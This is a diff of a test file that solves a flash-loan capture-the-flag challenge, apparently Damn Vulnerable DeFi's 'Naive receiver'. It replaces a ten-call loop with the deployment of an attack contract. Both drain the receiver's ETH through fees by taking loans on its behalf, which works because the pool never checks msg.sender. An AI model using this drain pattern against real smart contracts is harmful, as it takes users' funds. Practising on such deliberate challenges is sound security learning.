@@ -36,17 +36,28 @@ describe('[Challenge] Naive receiver', function () {
         ).to.eq(ETHER_IN_RECEIVER);
     });
 
+/*     
+    MULTIPLE TXs.
+
+    pool.flashLoan function is not checking that receiver is msg.sender
+    
+    We can call the flashloan 10 times in behalf of the receiver, receiving a 0 eth flashloan. 
+    This will make the receiver pay 10 ETH in fees.
+
     it('Execution', async function () {
-        /* 
-            pool.flashLoan function is not checking that receiver is msg.sender
-            
-            We can call the flashloan 10 times in behalf of the receiver, receiving a 0 eth flashloan. 
-            This will make the receiver pay 10 ETH in fees.
-        */
         const ETH = await pool.ETH();
         for (let i = 0; i < 10; i++) {
             await pool.flashLoan(receiver.address, ETH, 0, "0x")
         }
+    }); 
+*/
+
+    it('Execution', async function () {
+        /* 
+            Same approach as before but now using a proxy contract to make the draining of funds in one single transaction.
+        */
+        const AttackNaiveReceiverFactory = await ethers.getContractFactory('AttackNaiveReceiver', player);
+        await AttackNaiveReceiverFactory.deploy(pool.address, receiver.address);
     });
 
     after(async function () {
